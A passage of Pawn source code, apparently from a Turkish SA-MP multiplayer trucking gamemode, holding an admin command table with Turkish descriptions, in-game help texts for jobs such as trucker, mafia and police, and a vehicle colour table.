	{1, "/vipgor",                                                      "Hangi oyuncunun VIP olup olmadýðýna bakabilme komutudur."},
	{2, "/atamir",                                                      "Ýçinde bulunduðunuz aracý tamir etmeye yarayan komuttur."},
	{2, "/aftamir",                                                     "Tüm oyuncularýn aracýný tamir etmeye yarayan komuttur."},
	{2, "/jail",                                                        "Oyuncuyu hapse atma komutudur."},
	{2, "/uyar",                                                        "Oyuncuyu uyarma komutudur."},
	{2, "/portloc",                                                     "x,y,z girerek haritadaki o bölgeye ýþýnlanabilirsiniz."},
	{2, "/tele",                                                        "Bir oyuncuyu diðer oyuncuya ýþýnlanamak için kullanýlan komuttur."},
	{2, "/portvehicle",                                                 "Aracýn idsi ile o araca ýþýnlanma komutudur."},
	{2, "/fuel",                                                        "Ýçerisinde bulunduðunuz aracýn benzinini doldurma komutudur."},
	{2, "/fly",                                                         "Jetpack alma komutudur."},
	{2, "/cc",                                                          "Chat temizleme komutudur."},
	{2, "/ctemizle",                                                    "Chat temizleme komutudur."},
	{2, "/mute",                                                        "Oyuncuyu susturmaya yarayan komuttur."},
	{2, "/mutes",                                                       "Oyuncularýn mutesini görmeye yarayan komuttur."},
	{2, "/unmute",                                                      "Oyuncunun susturmasýný açmaya yarayan komuttur."},
	{2, "/respawn",                                                     "Aracý spawnlamaya yarayan komuttur."},
	{2, "/eject",                                                       "Araçtan oyuncuyu atmaya yarayan komuttur."},
	{2, "/sikayetler",                                                  "Son 50 þikayeti görmenize yarayan komuttur."},
	{2, "/etk",                                                         "Etkinlik komutlarýný görmeye yarayan komuttur."},
	{2, "/giveweapon",                                                  "Silah vermeye yarayan komuttur."},
	{2, "/aka",                                                         "Oyuncunun girdiði tüm hesaplarý görmeye yarar."},
	{3, "/gopos",                                                       "POS'a gidersiniz."},
	{3, "/asound <ID>",                                                 "Þarký çalýyor mu çalmýyor mu belirler."},
	{3, "/sarkikapat",                                                  "Sunucuda çalan þarkýyý komple kapatýr."},
    {3, "/loc",                                                         "Bulunduðunuz POS'u vs gösterir."},
	{3, "/bike",                                                        "Bisiklet yaratmayý saðlayan komuttur."},
	{3, "/car",                                                         "Araç çýkartmaya yarayan komuttur."},
	{3, "/veh",                                                         "Araç çýkartmaya yarayan komuttur."},
	{3, "/plane",                                                       "Hava aracý çýkartmaya yarayan komuttur."},
 	{3, "/trailer",                                                     "Kasa çýkartmaya yarayan komuttur."},
	{3, "/boat",                                                        "Deniz aracý çýkartmaya yarayan komuttur."},
	{3, "/get",                                                         "Oyuncuyu yanýna çekmeyi saðlayan komuttur."},
	{3, "/spawn",                                                       "Oyuncuyu spawn eder."},
	{3, "/dcar",                                                        "Dinamik olan eklenen aracýn içerisinde bulunursanýz aracý siler."},
	{3, "/scar",                                                        "Aracýn içerisinde bulunursanýz aracý spawnlar."},
	{3, "/cleanupcars",                                                 "Dinamik olan eklenen araçlarýn tümünü siler."},
	{3, "/odul",                                                        "Oyuncuya ödül vermeyi saðlayan komuttur."},
	{3, "/slap",                                                        "Oyuncuyu havaya fýrlatmayý saðlayan komuttur."},
	{3, "/dondur",                                                      "Oyuncuyu donduran komuttur."},
	{3, "/god",                                                         "Ölmemezliðinizi saðlayan komuttur."},
	{3, "/ban",                                                         "Oyuncuyu banlamaya yarayan komuttur."},
	{3, "/dorseget",                                                    "Dorseyi vs yanýnýza çeker."},
	{3, "/givelicense"                                                  "Týrcý ehliyeti verir."},
	{4, "/getall",                                                      "Tüm oyuncularý yanýnýza çeker."},
	{4, "/oyuncusifirla",                                               "Oyuncunun parasýný skorunu vb sýfýrlar."},
	{4, "/setskin",                                                     "Kýyafet vermeye yarayan komuttur."},
	{5, "/odulall",                                                     "Herkese ödül vermeye yarayan komuttur."},
	{5, "/ehliyetver",                                                  "Ehliyet vermeyi saðlayan komuttur."},
	{5, "/ssgor",                                                       "Oyuncunun serialini görmeye yarayan komuttur."},
	{5, "/engine <0/1>",                                                "Motoru çalýþtýrýp kapatmaya yarayan komuttur."},
	{5, "/caroption",                                                   "Aracýn bazý özelliklerini açýp kapatmaya yarayan komuttur."},
	{5, "/osaat",                                                       "Sunucunun saatini düzeltmeye yarar."},
	{5, "/ohava",                                                       "Sunucunun havasýný düzeltmeye yarar."},
	{5, "/aevgit",                                                      "Gireceðiniz ID'ýn evine gider."},
	{5, "/aisgit",                                                      "Gireceðiniz ID'ýn iþyerine gider."},
	{5, "/propertyid",                                                  "Üstünde bulunduðunuz ev simgesinin üzerinde ID'sýný bildirir."},
	{5, "/aevler",                                                      "Üstünde bulunduðunuz ev simgesinin üzerinde kiþinin neleri var bildirir."},
	{5, "/fixplayer",                                                   "Oyuncuyu buglardan arýndýrýr."},
	{5, "/chatengelle",                                                 "Chati engellemeye yarar."},
	{5, "/vehicle",                                                     "X,Y,Z'ye araç yaratýr."},
	{5, "/vuroni",                                                      "Oyuncuyu öldürmeyi saðlar."},
	{5, "/asilah",                                                      "Kendinize silahlar vermeyi saðlar."},
	{5, "/spawnall",                                                    "Herkesi spawn etmeye yarar."},
	{5, "/unclamp",                                                     "Tam olarak bilinmiyor."},
	{5, "/modcontrol",                                                  "Crash yapan araçlarý temizlemeye yarayan komuttur."},
	{6, "/sunucukilitle",                                               "Sunucuyu kilitler."},
	{6, "/sunucukilitac",                                               "Sunucunun kilidini açar."},
	{6, "/evolustur",                                                   "Bulunduðunuz yere ev oluþturur."},
	{6, "/labelolustur",                                                "Label oluþturur."},
	{6, "/labelsil",                                                    "Label siler."},
	{6, "/apara",                                                       "Bedava para kazanýrsýnýz."},
	{6, "/transfer",                                                    "Oyuncudan oyuncuya para transferi saðlar."},
	{6, "/delvehicle",                                                  "Dinamik olarak eklenmiþ aracý siler."},
	{6, "/restart",                                                     "Sunucuyu restartlamaya yarayan komuttur."},
	{6, "/isyeriolustur",                                               "Ýþyerini oluþturmaya yarayan komuttur."},
	{6, "/aa",                                                          "Üst yönetim admin chatidir."},
	{6, "/silahizni",                                                   "Silah izni verme komutudur."},
	{6, "/yak",                                                         "Bir kiþiyi yakmayý saðlar."},
	{6, "/freezeall",                                                   "Tüm oyuncularý dondurmayý saðlar."},
	{6, "/unfreezeall",                                                 "Tüm oyuncularý çözer."},
	{6, "/sban",                                                        "Oyuncuyu sýnýrsýz banlamaya yarayan komuttur."},
	{6, "/sban2",                                                       "Oyuncuyu offline sýnýrsýz banlamaya yarayan komuttur."},
	{6, "/ban2",                                                        "Oyuncuyu süreli offline banlamaya yarayan komuttur."},
	{6, "/unban",                                                       "Oyuncunun banýný açmaya yarayan komuttur."},
	{7, "/kickall",                                                     "Tüm oyuncularý oyundan atar."},
	{7, "/evsil",                                                       "Evi silmeye yarayan komuttur."},
	{7, "/score",                                                       "Kendine skor verir."},
	{7, "/saveloc",                                                     "Bulunduðunuz yerin POS'unu kaydeder."},
	{7, "/ssban",                                                       "Serial ban atar."},
	{7, "/ssunban",                                                     "Serial baný açar."},
	{7, "/object",                                                      "Obje ekler."},
	{7, "/pickup",                                                      "Objeyi hareket ettirir."},
	{7, "/delobject",                                                   "Objeyi siler."},
	{7, "/admsifre",                                                    "Oyuncunun admin þifresini düzenler."},
	{7, "/changenick",                                                  "Nick deðiþtirmeye yarayan komuttur."},
	{7, "/fsetlevel",                                                   "Fake-Level verir."},
	{7, "/setlevel",                                                    "Oyuncunun levelini artýrýp düþürmeye yarar."},
	{7, "/setleveldj",                                                  "DJ leveli verir."},
	{7, "/setleveldonator",                                             "Donatorluk verir."},
	{7, "/setlevelrehber",                                              "Rehberlik verir."},
	{7, "/createcamera",                                                "Radar ekler."},
	{7, "/delcamera",                                                   "Radarý siler."},
	{7, "/isyerisil",                                                   "Ýþyerini siler."},
	{7, "/skorver",                                                     "Skor verir."},
	{7, "/setscore",                                                    "Skor düzenler."},
	{7, "/mulksil",                                                     "Ýþyerini veya evi siler."},
	{7, "/hkick",                                                       "Bilinmiyor"},
	{7, "/asdorsesil",                                                  "Bilinmiyor"},
	{7, "/fu",                                                          "1 HP verip çöpçü skini verir. Ele dildo verir. +6 Yýldýz verir."},
	{7, "/afpolis",                                                     "Tüm oyuncularý polis yapar."},
	{7, "/aftirci",                                                     "Tüm oyuncularý týrcý yapar."},
	{7, "/ejectall",                                                    "Tüm oyuncularý araçtan atar."},
	{7, "/gpcall",                                                      "Tüm oyunculara polis aracý verir."},
	{7, "/evict",                                                       "Eve veya iþyerine el koyma komutudur."},
	{7, "/sirketolustur",                                               "Þirket oluþturma komutudur."},
	{7, "/sirketsil",                                                   "Þirketi silme komutudur."},
	{7, "/sirketparaver",                                               "Þirkete para verme komutudur."},
	{7, "/setsirketname",                                               "Þirketin ismini düzenleme komutudur."},
	{7, "/setsirkettag",                                                "Þirkete tag verme komutudur."},
	{7, "/setsirketuye",                                                "Þirketteki üyeleri gösterir."},
	{7, "/setsirketmaxuye",                                             "Þirkette maximum olabilecek üyeyi belirler."},
	{7, "/setsirketsahip",                                              "Þirket sahibini belirler."},
	{7, "/setsirketrenk",                                               "Þirket renklerini belirler."},
	{7, "/setsirketdeger",                                              "Þirket deðerini belirler."},
	{7, "/sirketver",                                                   "Þirketi bir oyuncunun üzerine verme komutudur."},
	{7, "/sirketbaslat",                                                "Þirketin haftalýk vergisini baþlatýr."},
	{7, "/sirketdurdur",                                                "Þirketin haftalýk vergisini durdurur."},
    {7, "/sirketbilgi <ID>",                                            "Þirketin bilgilerini gösterir."}
};

// Help text stuff
#define HelpIDTruckingClass     0 // Defines the ID for getting help about the trucking class
#define HelpIDBusDriverClass    1 // Defines the ID for getting help about the busdriver class
#define HelpIDMafiaClass    	2 // Defines the ID for getting help about the mafia class
#define HelpIDPoliceClass    	3 // Defines the ID for getting help about the police class
#define HelpIDPilotClass    	4 // Defines the ID for getting help about the pilot class
#define HelpIDRoadworkerClass   5 // Defines the ID for getting help about the roadworker class
#define HelpIDGemiciClass    	6
#define HelpIDOduncuClass    	7
#define HelpIDBalikciClass    	8
#define HelpIDConvoy            9 // Defines the ID for getting help about convoys
#define HelpIDBonusMissions     10 // Defines the ID for getting help about bonus missions
#define HelpIDHouses            11 // Defines the ID for getting help about the houses
#define HelpIDInsurance         12 // Defines the ID for getting help about insurance
#define HelpIDBuyingVehicles    13 // Defines the ID for getting help about buying vehicles
#define HelpIDRentingVehicles   14 // Defines the ID for getting help about renting vehicles
#define HelpIDBusinesses   		15 // Defines the ID for getting help about businesses
#define HelpIDGizliKasa   		16 // Defines the ID for getting help about businesses
#define HelpIDFBYClass          17



// Define the topics for the help menu
new AHelpTopics[][100] =
{
	{"»\t{FFCC00}Meslek\t»{FFCC00}»\t{FFFFFF}Týr þöförü"},
	{"»\t{FFCC00}Meslek\t»{FFCC00}»\t{FFFFFF}Otobüs þöförü"},
	{"»\t{FFCC00}Meslek\t»{FFCC00}»\t{FFFFFF}Mafya üyesi"},
	{"»\t{FFCC00}Meslek\t»{FFCC00}»\t{FFFFFF}Polis memuru"},
	{"»\t{FFCC00}Meslek\t»{FFCC00}»\t{FFFFFF}Pilot"},
	{"»\t{FFCC00}Meslek\t»{FFCC00}»\t{FFFFFF}Yol iþçisi"},
	{"»\t{FFCC00}Meslek\t»{FFCC00}»\t{FFFFFF}Gemici"},
	{"»\t{FFCC00}Meslek\t»{FFCC00}»\t{FFFFFF}Oduncu"},
	{"»\t{FFCC00}Meslek\t»{FFCC00}»\t{FFFFFF}Balýkçý"},
	{"»\t{FFCC00}Genel\t»{FFCC00}»\t{FFFFFF}Konvoylar"},
	{"»\t{FFCC00}Genel\t»{FFCC00}»\t{FFFFFF}Bonus görevler"},
	{"»\t{FFCC00}Genel\t»{FFCC00}»\t{FFFFFF}Ev sistemi"},
	{"»\t{FFCC00}Genel\t»{FFCC00}»\t{FFFFFF}Sigorta"},
	{"»\t{FFCC00}Genel\t»{FFCC00}»\t{FFFFFF}Araç satýn alma"},
	{"»\t{FFCC00}Genel\t»{FFCC00}»\t{FFFFFF}Araç kiralama"},
	{"»\t{FFCC00}Genel\t»{FFCC00}»\t{FFFFFF}Ýþyeri sistemi"},
	{"»\t{FFCC00}Genel\t»{FFCC00}»\t{FFFFFF}Gizli kasalar"},
	{"»\t{FFCC00}Genel\t»{FFCC00}»\t{FFFFFF}Cevik Kuvvet Meslegi"}
};
// Setup a custom type that holds all text-lines for all help-topics
enum THelpItem
{
	HelpID, // Holds the item for which to get help-info
	HelpText[128] // Contains one line for the help-info, every help-item can use multiple lines
}
// This array holds the texts for the /help command
new AHelpText[][THelpItem] =
{
	{HelpIDTruckingClass, "Tirci Görevinde Mallari Bir Yerden Baska yere Tasirsin."},
	{HelpIDTruckingClass, "Yapman gerek Bir Tir ve bir Kasa alip \"/work\" komutun gp Yükünü Secmek."},
	{HelpIDTruckingClass, "Kendi Yükünü Secmek istersen ilk önce SF den Ehliyet Almalisin."},
	{HelpIDTruckingClass, "Göreve Basladiysan Haritada bir Kirmizi Nokta gelir oraya gidip mallari Yüklemen lazim."},
	{HelpIDTruckingClass, "Oraya Vardiginda Mallar Yüklenmeye Baslar."},
	{HelpIDTruckingClass, "Yüklendikden sonra Haritada Gidecegin Yer Kirmizi gösterilir."},
	{HelpIDTruckingClass, "Gidecegin Yere Vardiginda Mallar Indirilir ve Parani alirsin."},
	{HelpIDTruckingClass, "Alicagin Miktar Yolun uzunluguna bagli."},
	{HelpIDTruckingClass, "Eyer Yükünüz Denizin üzerinde görüniyorsa Esc den Haritaya gidin ve zyi basili tutun."},
	{HelpIDTruckingClass, " "},
	{HelpIDTruckingClass, "Bazi Yükler Mafya Tarafindan Aranmakta, Böyle bir Yük Aldiginda Bilgileri olucaktir"},
	{HelpIDTruckingClass, "ve senin Kasani Calmaya Calisacaktir, Dikkatli ol."},
	{HelpIDTruckingClass, "Mafya Yükü Tasimak Extra Bonus verir."},
	{HelpIDTruckingClass, " "},
	{HelpIDTruckingClass, "Aracini Asisri Sekilde Yükleyebilirsin, ama Polisin haberi bundan olur."},
	{HelpIDTruckingClass, "Asiri Yükleme Extra Bonus almani Saglar."},
	{HelpIDTruckingClass, " "},
	{HelpIDTruckingClass, "Ayrica Kendi Tirini kulandiginda bi kücük Bonus alirsin."},
	{HelpIDTruckingClass, " "},
	{HelpIDTruckingClass, "Ayrica Ehliyeti San Fierrodaki Sürücü Kursundan alabilirsin."},
	{HelpIDTruckingClass, "Bununla Artik Yükleri kendin secip istedigin yere gidebilirsin."},
	{HelpIDTruckingClass, " "},
	{HelpIDTruckingClass, "Ayrica Tircilar Konvoy kurabilir."},
	{HelpIDTruckingClass, "\"Convoys\" Konusunda daha fazla bilgi alabilrsin."},

	{HelpIDBusDriverClass, "Otobüscü Sinfinda Yolculari Duraktan duraga Tasiyorsun."},
	{HelpIDBusDriverClass, "Bunu yapmak icin bir Otobüse bin ve \"/work\" yaz."},
	{HelpIDBusDriverClass, "Ilk Durak Haritanda Kirmizi olarak Gösterilir."},
	{HelpIDBusDriverClass, "Oraya git ve ilk Yolculari al."},
	{HelpIDBusDriverClass, " "},
	{HelpIDBusDriverClass, "Cünkü ilk basladgidinda Yolcu bulunmaz."},
	{HelpIDBusDriverClass, "Ikinci Duraktan sonra Yolcular Cuvaglir."},
	{HelpIDBusDriverClass, "Her Yolcu icin Para alirsin."},
	{HelpIDBusDriverClass, " "},
	{HelpIDBusDriverClass, "Görev bitginde Deponun Yeride gösterilir."},
	{HelpIDBusDriverClass, "Istersen Görevi Tekrar yapip Haritdadaki Duraga gidebilrisin"},
	{HelpIDBusDriverClass, "Yada Depoya gidip Brakabilirsin."},

	{HelpIDMafiaClass, "Mafya Sinifinda Kacak Mallari biyerden baska yere Tasirsin."},
	{HelpIDMafiaClass, "Bunu yapmak icin Sandking veya moonbeama binip \"/work\" yazmak gerek."},
	{HelpIDMafiaClass, "This works almost the same way as the trucker class."},
	{HelpIDMafiaClass, "Mafya Overload veya Bonus yükü alamaz."},
	{HelpIDMafiaClass, "Her yükte Polis tarfindan 4 Yildiz ile aranirsin."},
	{HelpIDMafiaClass, " "},
	{HelpIDMafiaClass, "Mafyada ikinci Görev ise Tircilarin Kasasini calmak."},
	{HelpIDMafiaClass, "Birisi Mafyanin ilgi cektigi bir Yükü tasirsa Haritada Görüntülenir"},
	{HelpIDMafiaClass, "Haritada gösterildi anda bunu Calmak icin Sansin olucakdir."},
	{HelpIDMafiaClass, "Tirci Tekli Kamyonda ise Söförü indrip Kamyonu calman lazim"},
	{HelpIDMafiaClass, "Söförü Öldürmemek Sartiyla."},
	{HelpIDMafiaClass, "Tirci Kasa ile Yoldaysa Kasayi Calmalisin."},
	{HelpIDMafiaClass, "Ayrica Komple Tiri Kasayla beraber calabilirsin."},
	{HelpIDMafiaClass, " "},
	{HelpIDMafiaClass, "Kasa ciktigi anda Takan icin 60 Saniyen olucakdir."},
	{HelpIDMafiaClass, "Bunu basaramassan Kasa Kaybolur ve Görev Iptal edilir."},
	{HelpIDMafiaClass, "Kasayi Taktiysan Onu Mafya Deposuna götür."},
	{HelpIDMafiaClass, "Kasayi Depoya braktiginda Paran ödenir."},

	{HelpIDPoliceClass, "Polis Sinifinda Baska Oyunclara Ceza Kesersin."},
	{HelpIDPoliceClass, "Tircilar Asiri yüklendiginde 2 Yildiz alirlar."},
	{HelpIDPoliceClass, "Mafya Görev Yaptiginda 4 Yildiz alir."},
	{HelpIDPoliceClass, "Birisi Radara Yakalandiginda 1 Yildiz alir."},
	{HelpIDPoliceClass, " "},
	{HelpIDPoliceClass, "Yildizli Oyuncular Haritada Göüntülenir."},
	{HelpIDPoliceClass, "Bu Oyunculari Durdurup Ceza Kesmelisin."},
	{HelpIDPoliceClass, "Oyuncuya Yaklastiginda ctrlye Basip Oyuncuyu Uyarabilrsin."},
	{HelpIDPoliceClass, "Oyuncu Uyariyi alir ve Büyük ihtmalle Durur."},
	{HelpIDPoliceClass, " "},
	{HelpIDPoliceClass, "Oyuncu Durdugu Zaman Sol Mouse ile Ceza Kesersin."},
	{HelpIDPoliceClass, "Ceza Kesmen icin Aracaindan Inmelisin."},
	{HelpIDPoliceClass, "Oyuncu 60 Saniye icinde Durmasza Yakalandigi Taktirde Hapise Gönderilir."},
	{HelpIDPoliceClass, "Ayrica Paran 2ye Katlanir."},

	{HelpIDPilotClass, "Pilot Sinifinda Yolculari veya Kargolari Bir Hava Alanindan Baskasina Götürürsün."},
	{HelpIDPilotClass, "Bunu yapmak icin bir Ucaga bin ve \"/work\" yaz."},
	{HelpIDPilotClass, "Hem Yolcu hemde Kargo Tasilir."},
	{HelpIDPilotClass, "Ayrica Helikopter ilede Görevler yapilabilir."},
	{HelpIDPilotClass, "Helikopterler sadece Yolcu Tasir."},

	{HelpIDRoadworkerClass, "Yol Tamircisinin iki Isi vardir."},
	{HelpIDRoadworkerClass, " "},
	{HelpIDRoadworkerClass, "Ilk Görevi Radarlari Tamir etmek."},
	{HelpIDRoadworkerClass, "Utility Aracini alip ve \"/work\" yazmalisin."},
	{HelpIDRoadworkerClass, "Bozulmus Radarin yanina git ve onu Tamir et."},
	{HelpIDRoadworkerClass, "Tamir edildigi zaman baska bir Radar Haritada Görüntülencek."},
	{HelpIDRoadworkerClass, "Tamirden Sonra ister Geri gidebilirsin veya baska Radar Tamir edebilirsin"},
	{HelpIDRoadworkerClass, "Görevi tamamladikdan sonra Parani verir."},
	{HelpIDRoadworkerClass, " "},
	{HelpIDRoadworkerClass, "Ikinci Görev ise Bozuk Araclari Hurdaciya Tasir."},
	{HelpIDRoadworkerClass, "Cekici Aracini al ve \"/work\" yaz."},
	{HelpIDRoadworkerClass, "Haritadaki Kimrizi yere git ve Araci al."},
	{HelpIDRoadworkerClass, "Kirmizi Noktada arac otomatik olarak takilacak."},
	{HelpIDRoadworkerClass, "Araci al ve Hurdaciya götür."},
	{HelpIDRoadworkerClass, " "},
	{HelpIDRoadworkerClass, "Eyer Arac cikarsa"},
	{HelpIDRoadworkerClass, "Sol mousa bas ve Araci Tekrardan tak."},

	{HelpIDGemiciClass, "Gemicilerin görevleri kamyoncularýnkine benzer"},
	{HelpIDGemiciClass, "Bir tekneye binip /work yazarak görev baþlatabilirler"},
	{HelpIDGemiciClass, "Amaç limanlar arasýnda yük taþýyarak para kazanmaktýr"},

	{HelpIDFBYClass, "Cevik Kuvvet görevleri Polislerinkine benzer"},
	{HelpIDFBYClass, "Yanliz Cevik Kuvvetde de Suclulari yavaslatmak icin Silah bulunmakta"},
	{HelpIDFBYClass, "Silah ile Sucsuzlara Ates etmek Ban Sebebidir"},

	{HelpIDOduncuClass, "Oduncular haritadaki koyu yeþil bölgelerde odun kesebilirler"},
	{HelpIDOduncuClass, "Odun kesmeye baþlamak için koyu yeþik bölgede /work yazmalýlar"},
	{HelpIDOduncuClass, "Ekranýn saðýnda odun kesme aþamasý ve üzerinizdeki odun miktarý yazar"},
	{HelpIDOduncuClass, "Üzerinizde en fazla 20 odun taþýyabilirsiniz"},
	{HelpIDOduncuClass, "Kestiðiniz odunlarý satýþ noktasýnda /odunsat yazarak satabilirsiniz"},

	{HelpIDBalikciClass, "Balýkçýlar balýkçý teknesinde /work yazarak balýk tutabilirler"},
	{HelpIDBalikciClass, "Oyuncular üzerlerinde en fazla 20 balýk taþýyabilir"},
	{HelpIDBalikciClass, "Balýk tutma aþamasý ve üzernizideki balýk sayýsý ekranýn sað kenarýnda yazar"},
	{HelpIDBalikciClass, "Sattýðýnýz balýklarý satýþ noktasýnda /baliksat yazarak satabilirsiniz"},

	{HelpIDConvoy, "Konvoy Coklu Oyuncularin Ayni Görevin yapmasi icindir."},
	{HelpIDConvoy, "Sadece Tircilak Konvoy yapabilir."},
	{HelpIDConvoy, "Her Konvoyun bir Lideri var , o liderdre Görevleri secer."},
	{HelpIDConvoy, "Sadece 5 Konvoy birden yapilabilir."},
	{HelpIDConvoy, "Cünkü Büyük Konvoylarda daha cok para kazanilabilir"},
	{HelpIDConvoy, "Konvoylarin 25 kisilik Limiti vardir."},
	{HelpIDConvoy, " "},
	{HelpIDConvoy, "Her Konvoy Üyesi yüzde 25% katki saglar."},
	{HelpIDConvoy, "Konvoylar ayrica Bonus yükleri icin 2 kat Bonus alir."},
	{HelpIDConvoy, "Konvoy baslatmak veya girmek icin \"/convoy\" kulanmalisin."},
	{HelpIDConvoy, " "},
	{HelpIDConvoy, "Konvoy basladiginda kimse giremez."},
	{HelpIDConvoy, "Tüm Üyeler Yüklerini braktiginda Parasini alicaktir,"},
	{HelpIDConvoy, "ve Konvoy yeni Üye almak icin acilir."},

	{HelpIDBonusMissions, "Bonus Yükü yaptigin yükü tanir ve parani öder."},
	{HelpIDBonusMissions, "Sadece Tircilar Bonus yükü yapabilir , Bonus yükü 2 kat ödeme yapar."},
	{HelpIDBonusMissions, "Bunun Yani Sira Mafia yükü veya Asiri Yüklemedede extra Bonus alinir, ..."},
	{HelpIDBonusMissions, "Bonus yükü sadece bir tirci tarafindan veya Konvoylarala yapilir."},
	{HelpIDBonusMissions, "Bonus yükü yapildiginda baska bir oyuncu Bonusu yapamaz,"},
	{HelpIDBonusMissions, "ve parayi alamaz."},
	{HelpIDBonusMissions, "Bonus yükü tamamlana kadar gecerlidir tamamlandigi taktirde yeni Bonus yükü gelir."},

	{HelpIDHouses, "Evler Oyuncular tarafindan satin alinan Binalardir."},
	{HelpIDHouses, "Her Oyuncu 2 Ev alabilir."},
	{HelpIDHouses, "Her Evin bir Satis Fiyat ve Günceleme Fiyati vardir."},
	{HelpIDHouses, "Arac Slotu Ev Leveline Baglidir."},
	{HelpIDHouses, "Eyer Evin level 1 iste sadece 1 arac alma hakkin var."},
	{HelpIDHouses, "Her Ev Güncelemesinde 1 Arac Slotu acilir."},
	{HelpIDHouses, "Her evin degsik Icerigi vardir Güncelleme ile degisir."},
	{HelpIDHouses, "En yüksek Ev Leveli 10 dur."},
	{HelpIDHouses, "Bu Evler cok pahlidir cünkü 10 Arac birden alinabiliyor ve Sayisi cok azdir."},
	{HelpIDHouses, " "},
	{HelpIDHouses, "Ev alindigi zaman icerisine girilebilir"},
	{HelpIDHouses, "Bu komutu \"/icerigir\" kulanarak girilebilir (Ev önünde)."},
	{HelpIDHouses, "Evine girdiginde \"/evmenu\" yazarak ev degsiklikleri yapabilirsin."},
	{HelpIDHouses, "Evi güncelleye bilir ev alinabilir ve sigorta yaptirilabilir,"},
	{HelpIDHouses, "ÖNEMLI : Arac Sigortasi Yaptirilmadigi halde Araclar patladiginda kaybolur."},
	{HelpIDHouses, "Ayrica Evi satip yeni baska bir evde alinabilir."},
	{HelpIDHouses, "Satilan arac Paranin yarisini geri verir."},
	{HelpIDHouses, "Yapilan Modifikasyonlarda dahil."},
	{HelpIDHouses, " "},
	{HelpIDHouses, "Ayrica Evini baskasinda acabilirsin, böylece Oyuncular evini ziyaret edebilir."},
	{HelpIDHouses, "Kapatmak istediginde yine ayni sekilde /evmenu üzerinden yapilir."},

	{HelpIDInsurance, "Arac Sigortasi cok Önemlidir aracin suya düsmesi veya Patlamasi halinda kaybolur."},
	{HelpIDInsurance, "Arac sigortasi /evmenu üzerinden yapilabilir."},
	{HelpIDInsurance, "Her Ev icin ayri sigorta yapilmasi lazim."},

	{HelpIDBuyingVehicles, "Oyuncular sadece Evi oldugu taktirde arac alabilirler."},
	{HelpIDBuyingVehicles, "Araclar aldigin eve baglidir"},
	{HelpIDBuyingVehicles, "Arac aldiginda evin disina cikip /getcar ile alabilirsin."},
	{HelpIDBuyingVehicles, "Baska Oyuncular senin Aracini kulanamaz sadece yan koltukta oturabilirler."},

	{HelpIDRentingVehicles, "Evi olmayanlar kendilerine arac kiralayabilirler."},
	{HelpIDRentingVehicles, "San Fierrodaki wang carsdan alinabilir."},
	{HelpIDRentingVehicles, " "},
	{HelpIDRentingVehicles, "Arac kiralandiginda Sahip siz olursunuz."},

	{HelpIDBusinesses, "Her Oyuncunun 2 Isyeri alma haki vardir."},
	{HelpIDBusinesses, "Evler gibi is Yerleride Güncelenebilir."},
	{HelpIDBusinesses, " "},
	{HelpIDBusinesses, "Is Yeri sahibi olmak size her Saat para kazandirir."},
	{HelpIDBusinesses, "Oyunda olmadigin zamanda is Yerin para kazanir."},

	{HelpIDGizliKasa, "Haritada 30 adet gizli siyah kasalar gizlenmiþtir"},
	{HelpIDGizliKasa, "Bunlarý týrýnýzýn arkasýna takarak alabilirsiniz"},
	{HelpIDGizliKasa, "Gizli kasayý arkanýza taktýðýnýzda haritada kýrmýzý yer iþaretlenir"},
	{HelpIDGizliKasa, "Bu kýrmýzý yere gizli kasayý götürdüðünüzde size 5.000$ ve 5 Skor verir"},
	{HelpIDGizliKasa, "Bütün gizli kasalarý topladýðýnýzda ayrýyetten 1.000.000$ ve 100 Skor alýrsýnýz."}

//	{HelpIDBusinesses, "xxxxxxxxxxxx"},
};

// This array holds the vehicle-colors
new AVehicleColors[][10] =
{
	{"{000000}"},	{"{f5f5f5}"},	{"{2a77a1}"},	{"{840510}"},	{"{253739}"}, // Colors 0, 1, 2, 3, 4
	{"{87446f}"},	{"{d68f11}"},	{"{4c75b7}"},	{"{bdbdc5}"},	{"{5e7072}"}, // Colors 5, 6, 7, 8, 9

	{"{46597a}"},	{"{66697a}"},	{"{5e7e8d}"},	{"{58595b}"},	{"{d6dbd5}"}, // Colors 10, 11, 12, 13, 14
	{"{9ca1a4}"},	{"{34603f}"},	{"{740e1b}"},	{"{7c0a2b}"},	{"{a09d94}"}, // Colors 15, 16, 17, 18, 19

	{"{3b4e79}"},	{"{732e40}"},	{"{691e3c}"},	{"{96918d}"},	{"{515459}"}, // Colors 20, 21, 22, 23, 24
	{"{3f3e46}"},	{"{a5a9a8}"},	{"{645c5a}"},	{"{3c4969}"},	{"{969591}"}, // Colors 25, 26, 27, 28, 29

	{"{431f21}"},	{"{5f272a}"},	{"{8494ab}"},	{"{757a7d}"},	{"{646464}"}, // Colors 30, 31, 32, 33, 34
	{"{5b5853}"},	{"{252527}"},	{"{2e3a36}"},	{"{93a398}"},	{"{6d7a8a}"}, // Colors 35, 36, 37, 38, 39

	{"{28201e}"},	{"{6f6860}"},	{"{7c1c28}"},	{"{600a15}"},	{"{193828}"}, // Colors 40, 41, 42, 43, 44
	{"{5c1b1f}"},	{"{9c9872}"},	{"{7a7561}"},	{"{989586}"},	{"{acb0b1}"}, // Colors 45, 46, 47, 48, 49

	{"{848a88}"},	{"{305045}"},	{"{4e6368}"},	{"{162248}"},	{"{282f4c}"}, // Colors 50, 51, 52, 53, 54
	{"{7e6257}"},	{"{9fa4aa}"},	{"{9c8d70}"},	{"{6e1821}"},	{"{4e6881}"}, // Colors 55, 56, 57, 58, 59

	{"{9c9d98}"},	{"{907347}"},	{"{661d26}"},	{"{949c9f}"},	{"{a3a8a4}"}, // Colors 60, 61, 62, 63, 64
	{"{8f8c47}"},	{"{331a1d}"},	{"{697a8a}"},	{"{aaad8e}"},	{"{ac988f}"}, // Colors 65, 66, 67, 68, 69

	{"{86202e}"},	{"{708298}"},	{"{585953}"},	{"{9aa68e}"},	{"{601a1a}"}, // Colors 70, 71, 72, 73, 74
	{"{21212d}"},	{"{a4a097}"},	{"{ab9d83}"},	{"{78222b}"},	{"{0e326e}"}, // Colors 75, 76, 77, 78, 79

	{"{722a40}"},	{"{7a715f}"},	{"{741c28}"},	{"{1d2f31}"},	{"{4e322f}"}, // Colors 80, 81, 82, 83, 84
	{"{7d1b44}"},	{"{2f5b20}"},	{"{395a83}"},	{"{6c2837}"},	{"{a7a28f}"}, // Colors 85, 86, 87, 88, 89

	{"{b0b2b1}"},	{"{364155}"},	{"{6d6d6f}"},	{"{0f6a89}"},	{"{204b6d}"}, // Colors 90, 91, 92, 93, 94
	{"{2c3d57}"},	{"{9a9e9d}"},	{"{6d8494}"},	{"{4d5c5f}"},	{"{ac9b7f}"}, // Colors 95, 96, 97, 98, 99

